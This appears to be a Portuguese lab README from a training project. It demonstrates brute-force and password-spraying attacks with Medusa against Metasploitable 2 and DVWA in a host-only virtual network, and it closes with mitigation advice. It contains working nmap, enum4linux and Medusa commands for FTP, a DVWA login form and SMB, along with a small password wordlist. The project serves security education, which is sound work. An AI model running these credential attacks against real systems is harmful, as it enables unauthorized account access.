🛡️ Projeto: Ataques de Força Bruta com Medusa no Kali Linux

Ambiente Vulnerável – Metasploitable 2 & DVWA

📌 Descrição do Projeto

Este projeto tem como objetivo demonstrar, em ambiente controlado e seguro, como funcionam ataques de força bruta utilizando a ferramenta Medusa no Kali Linux, aplicados a serviços vulneráveis hospedados no Metasploitable 2 e no DVWA (Damn Vulnerable Web Application).

Além de executar os ataques, o projeto documenta boas práticas de mitigação, wordlists utilizadas e reflexões sobre riscos e prevenção.

🗂️ Estrutura do Repositório
/project
 ├── README.md
 ├── /images
 │    ├── vm-config.png
 │    ├── medusa-ftp.png
 │    ├── dvwa-bruteforce.png
 │    └── smb-spray.png
 ├── /wordlists
 │    └── custom.txt
 └── /scripts
      └── medusa_script.sh

1️⃣ Configuração do Ambiente
🖥️ Máquinas Virtuais

Foram criadas duas máquinas no VirtualBox:

Kali Linux – atacante

Metasploitable 2 – alvo vulnerável

DVWA – executado no Metasploitable (porta 80)

🔧 Configuração de Rede

Ambas as VMs foram configuradas com:

✔ Host-Only Adapter
✔ Mesma sub-rede
✔ Permite comunicação direta entre Kali ↔ Metasploitable

Exemplo de IPs:

Kali Linux: 192.168.56.10

Metasploitable 2: 192.168.56.20

2️⃣ Enumeração Inicial com Nmap

Antes de qualquer ataque, foi realizada uma enumeração para descobrir serviços expostos:

nmap -sV -p- 192.168.56.20


Principais portas encontradas:

Porta	Serviço	Observação
21	FTP	Login anônimo habilitado
22	SSH	Versão vulnerável
80	HTTP	DVWA disponível
139/445	SMB	Usuários expostos
3️⃣ Ataques Realizados
🔶 3.1 Força Bruta em FTP (porta 21)
🧰 Ferramenta: Medusa

Criei uma wordlist simples:

admin
root
msfadmin
123456
password


Comando:

medusa -h 192.168.56.20 -u msfadmin -P wordlists/custom.txt -M ftp


📌 Resultado:
Login encontrado com sucesso para usuário msfadmin.

(adicione print em /images/medusa-ftp.png)

🔶 3.2 Brute Force em Formulário Web (DVWA)
Passos:

Abrir DVWA no navegador:
http://192.168.56.20/dvwa

Configurar DVWA Security Level → Low

Identificar o endpoint do formulário:

http://192.168.56.20/dvwa/vulnerabilities/brute/

Comando:
medusa -h 192.168.56.20 -u admin -P wordlists/custom.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/" \
  -m DENY:"Login failed" \
  -m USER:"username" \
  -m PASS:"password" \
  -m COOKIE:"PHPSESSID=XYZ; security=low"


(Trocar COOKIE pelo seu valor atual)

📌 Resultado:
Senha do usuário admin descoberta.

🔶 3.3 Password Spraying via SMB
Obtenção de lista de usuários:
enum4linux -a 192.168.56.20 | grep 'user'


Wordlist gerada automaticamente:

msfadmin
user
service
postgres

Ataque:
medusa -h 192.168.56.20 -U wordlists/users.txt -P wordlists/custom.txt -M smbnt


📌 Resultado:
Credenciais válidas encontradas para SMB.

4️⃣ Medidas de Mitigação
🔐 Reforçar políticas de senha

Senhas longas (12+ caracteres)

Misturar letras, números, símbolos

Bloqueio após tentativas falhas

🔧 Configuração de serviços

Desabilitar login anônimo em FTP

Limitar tentativas no SSH

Usar fail2ban

🧱 Hardening de DVWA / web apps

Segurança “HIGH”

Captcha

Regras no firewall (WAF)

📊 Monitoramento

Logs centralizados

Alertas de tentativa de brute force

Detecção de comportamento anômalo

5️⃣ Conclusões do Projeto

Este projeto demonstrou:

✔ Como ataques de força bruta funcionam na prática
✔ A importância da enumeração antes da exploração
✔ Como o Medusa pode automatizar tentativas de login
✔ Vulnerabilidades comuns em FTP, Web e SMB
✔ Como implementar medidas de defesa

Além disso, reforça a importância de ambientes controlados para fins educacionais e de auditoria.

📚 Recursos Utilizados

Kali Linux

Metasploitable 2

VirtualBox

Medusa

DVWA

Nmap

Enum4Linux

Wordlists personalizadas
